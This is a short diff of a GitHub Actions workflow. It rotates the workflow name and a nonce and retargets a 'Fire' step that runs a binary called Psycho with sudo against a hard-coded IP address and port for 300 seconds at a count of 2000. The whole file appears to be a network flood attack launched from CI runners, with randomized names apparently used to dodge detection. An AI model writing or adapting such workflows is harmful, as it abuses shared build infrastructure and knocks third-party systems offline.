@@ -1,4 +1,4 @@
-name: psycho-d58a2325
+name: psycho-40fb2bfe
 on:
   push:
     branches: [ main, master ]
@@ -20,6 +20,6 @@ jobs:
         chmod +x Psycho.exe || true
     - name: Fire
       run: |
-        timeout 300s sudo ./Psycho 91.108.17.19 32002 300 2000 || timeout 300s sudo ./Psycho.exe 91.108.17.19 32002 300 2000 || true
-    - name: Nonce d58a2325
-      run: echo "nonce=d58a2325"
+        timeout 300s sudo ./Psycho 91.108.17.8 32003 300 2000 || timeout 300s sudo ./Psycho.exe 91.108.17.8 32003 300 2000 || true
+    - name: Nonce 40fb2bfe
+      run: echo "nonce=40fb2bfe"
